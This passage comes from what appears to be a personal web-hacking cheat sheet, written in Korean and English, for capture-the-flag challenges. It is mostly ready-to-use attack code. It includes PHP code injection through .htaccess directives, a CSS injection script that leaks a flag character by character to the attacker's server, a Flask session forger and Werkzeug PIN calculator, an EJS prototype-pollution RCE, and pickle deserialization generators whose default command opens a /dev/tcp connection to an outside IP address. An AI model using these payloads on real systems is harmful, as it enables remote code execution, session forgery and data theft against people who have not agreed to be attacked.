/var/www/ex4a/foo.php</span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure></li><li><p>failed PHP injection via error_log and auto_prepend_file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /var/www/ipc/ex4b/foo.php</span><br><span class="line">php_value auto_prepend_file &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure></li><li><p>PHP code injection via error_log and UTF-7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /var/www/ipc/ex4c/foo.php</span><br><span class="line">#---- &quot;&lt;?php phpinfo(); __halt_compiler();&quot; in UTF-7:</span><br><span class="line">php_value include_path &quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"></span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Erlang"><a href="#Erlang" class="headerlink" title="Erlang"></a>Erlang</h2><ul><li><p>list all defined functions</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">math:module_info().</span><br><span class="line">module_info().</span><br></pre></td></tr></table></figure></li></ul><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><ul><li><p>relative path override</p><ul><li><a href="https://blog.rubiya.kr/index.php/2019/04/17/relative-path-overwrite/">https://blog.rubiya.kr/index.php/2019/04/17/relative-path-overwrite/</a></li></ul></li><li><p>css injection</p><ul><li>get tag attribute</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/css; charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii</span> = <span class="number">33</span>; <span class="variable">$ascii</span> &lt; <span class="number">126</span>; <span class="variable">$ascii</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;@font-face&#123; font-family:poc; src: url(http://&#123;my_server&#125;/?&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>).<span class="string">&quot;); unicode-range:U+00&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$ascii</span>).<span class="string">&quot;;&#125;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#flag&#123; font-family:poc;&#125;</span></span><br></pre></td></tr></table></figure><ul><li>get content charset</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/css; charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii</span> = <span class="number">33</span>; <span class="variable">$ascii</span> &lt; <span class="number">126</span>; <span class="variable">$ascii</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;@font-face&#123; font-family:poc; src: url(http://&#123;my_server&#125;/?&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>).<span class="string">&quot;); unicode-range:U+00&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$ascii</span>).<span class="string">&quot;;&#125;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#flag&#123; font-family:poc;&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="logical-vul"><a href="#logical-vul" class="headerlink" title="logical vul"></a>logical vul</h2><ul><li>never expired state + random event</li><li>idor<ul><li>설명 불필요</li></ul></li></ul><h2 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth bypass"></a>auth bypass</h2><ul><li><p>jwt none type injection</p></li><li><p>flask session generator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">object</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.secret_key = <span class="literal">None</span></span><br><span class="line">app = App()  </span><br><span class="line">app.secret_key = sys.argv[<span class="number">1</span>]</span><br><span class="line">si = SecureCookieSessionInterface()  </span><br><span class="line">serializer = si.get_signing_serializer(app)  </span><br><span class="line">session = serializer.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>:<span class="literal">True</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(session)</span><br></pre></td></tr></table></figure></li><li><p>flagk-unsign</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br><span class="line">flask-unsign –sign –cookie <span class="string">&quot;&#123;&#x27;is_admin&#x27;: True&#125;&quot;</span> –secret ‘DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8<span class="string">&#x27; –legacy</span></span><br></pre></td></tr></table></figure></li><li><p>flask pin calculator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410463771&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cf0ba4b49af0063252dc6943557b002fe787baab6d9421be9c14813731e6626b&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></li></ul><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><ul><li><p>prototype pollution</p><ul><li>EJS rce (<a href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a>)</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">outputFunctionName</span> = <span class="string">&quot;x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;touch 1&#x27;);x&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">renderFile</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index.ejs&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">7878</span>)</span><br></pre></td></tr></table></figure><ul><li><p><a href="https://blog.rwx.kr/prototype-pollution-to-rce/">https://blog.rwx.kr/prototype-pollution-to-rce/</a></p></li><li><p>sandbox escape</p></li><li><p>unicode failure</p></li><li><p>regex dos</p></li><li><p>read file from UNC (windows)</p><ul><li>fs<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&quot;\\1.2.3.4\shared\1.js&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>express render<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// set render engine</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span> (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(req.<span class="property">query</span>.<span class="property">file</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Object.freeze(location)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.replace(1)</span><br></pre></td></tr></table></figure></li><li><p>JSON.stringify spacer</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;,<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&quot;cmd&quot;:1,&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><p>variable _</p></li><li><p>repr 모드에서 마지막 라인 반환값과 동일</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;applemint&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(_); <span class="comment">// applemint</span></span><br></pre></td></tr></table></figure></li><li><p>String.fromCharCode mod</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">65601</span>) === <span class="string">&#x27;A&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>scope touch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scope1 = <span class="title class_">Function</span>(<span class="string">&#x27;let abc = 123; scope2();&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scope2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>.<span class="property">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">scope1</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure></li><li><p>property searcher</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">obj, history = []</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (history.<span class="property">length</span> == <span class="number">0</span> &amp;&amp; obj[<span class="title class_">Symbol</span>.<span class="property">toStringTag</span>]) history.<span class="title function_">push</span>(obj[<span class="title class_">Symbol</span>.<span class="property">toStringTag</span>]); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> keys = [];</span><br><span class="line">    <span class="keyword">if</span> (obj) keys = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(obj);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> keys) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> val = obj[key];</span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; val[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] &amp;&amp; (val[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]+[]).<span class="title function_">indexOf</span>(<span class="string">&#x27;[native code]&#x27;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[<span class="subst">$&#123;history.join(<span class="string">&#x27;.&#x27;</span>)&#125;</span>.<span class="subst">$&#123;key&#125;</span>][Symbol.iterator]`</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(val[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] + []);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> val === <span class="string">&#x27;object&#x27;</span> &amp;&amp; val !== obj &amp;&amp; key !== history[history.<span class="property">length</span> - <span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="title function_">search</span>(val, history.<span class="title function_">concat</span>(key));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">search</span>(<span class="variable language_">global</span>);</span><br></pre></td></tr></table></figure><ul><li>overflow</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111111111</span> === <span class="number">11111111111111112</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>infinite loop with overwrite object attribute on array expected</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://localhost/?param[length]=1e9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> data = req.<span class="property">query</span>.<span class="property">param</span>;</span><br><span class="line">   <span class="keyword">var</span> output = <span class="string">&#x27;output : &#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">      output += data[i];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   res.<span class="title function_">send</span>(output);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><ul><li><p>python pickle</p><ul><li><p>pickle (os.system)</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">DEFAULT_COMMAND = <span class="string">&quot;bash -c &#x27;echo 1 &gt; /dev/tcp/45.32.48.238/8888&#x27;&quot;</span></span><br><span class="line">COMMAND = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> DEFAULT_COMMAND</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>pickle (eval)</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>,(<span class="string">&quot;__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>cPickle (os.system)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">DEFAULT_COMMAND = <span class="string">&quot;bash -c &#x27;echo 1 &gt; /dev/tcp/45.32.48.238/8888&#x27;&quot;</span></span><br><span class="line">COMMAND = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> DEFAULT_COMMAND</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>cPickel (eval)</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>,(<span class="string">&quot;__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>pickle (for test)</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, pickle, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!] no arguments&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] &#x27;</span> + <span class="built_in">str</span>(pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))))</span><br></pre></td></tr></table></figure></li><li><p>pickle (for test)</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, cPickle, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!] no arguments&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] &#x27;</span> + <span class="built_in">str</span>(cPickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))))</span><br></pre></td></tr></table></figure></li></ul></li><li><p>php</p><ul><li><p>PHPGGC</p><ul><li>원데이 가젯들을 사용하여 페이로드 자동 구성해주는 도구</li><li><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></li></ul></li><li><p>unserlize + replace 문제<br>제거되는 문자열로 인하여 길이 오프셋이 달라지는 취약점을 사용, 이를 통해 객체 조작이 가능해짐<br>이 타입 문제의 경우 에러 메시지를 비활성화 해놓는 경우가 많으며, <code>extract</code> 함수 등과 같이 쓰이기도 한다.</p></li><li><p>member methods</p><ul><li>__construct<ul><li>설명추가예정</li></ul></li><li>__destruct<ul><li>설명추가예정</li></ul></li><li>__wakeup<ul><li>설명추가예정</li></ul></li><li>__sleep<ul><li>설명추가예정</li></ul></li><li>__toString<ul><li>설명추가예정</li></ul></li></ul></li><li><p>symbols</p><ul><li><p><code>s</code> : String</p></li><li><p><code>i</code> : Integer</p></li><li><p><code>b</code> : Boolean</p></li><li><p><code>N</code> : NULL</p></li><li><p><code>a</code> : Array</p></li><li><p><code>O</code> : Object</p><ul><li><p>public property</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:4:&quot;test&quot;;...&#125;</span><br></pre></td></tr></table></figure></li><li><p>private property</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:12:&quot;%00Kaibro%00test&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>protected property</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#123;s:7:&quot;%00*%00test&quot;;...&#125;</span><br></pre></td></tr></table></figure></li><li><p>private와 protected property는 직접 손으로 작성하여 구성하거나, constructor 에 멤버 변수 할당하도록 클래스 선언한 후, serialize 하면 됨.</p></li></ul></li><li><p><code>C</code> : custom object</p></li><li><p><code>R</code> : pointer reference</p></li></ul></li></ul></li><li><p>java</p><ul><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md]">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure</a> Deserialization&#x2F;Java.md)</li></ul></li><li><p>ruby</p><ul><li><p><a 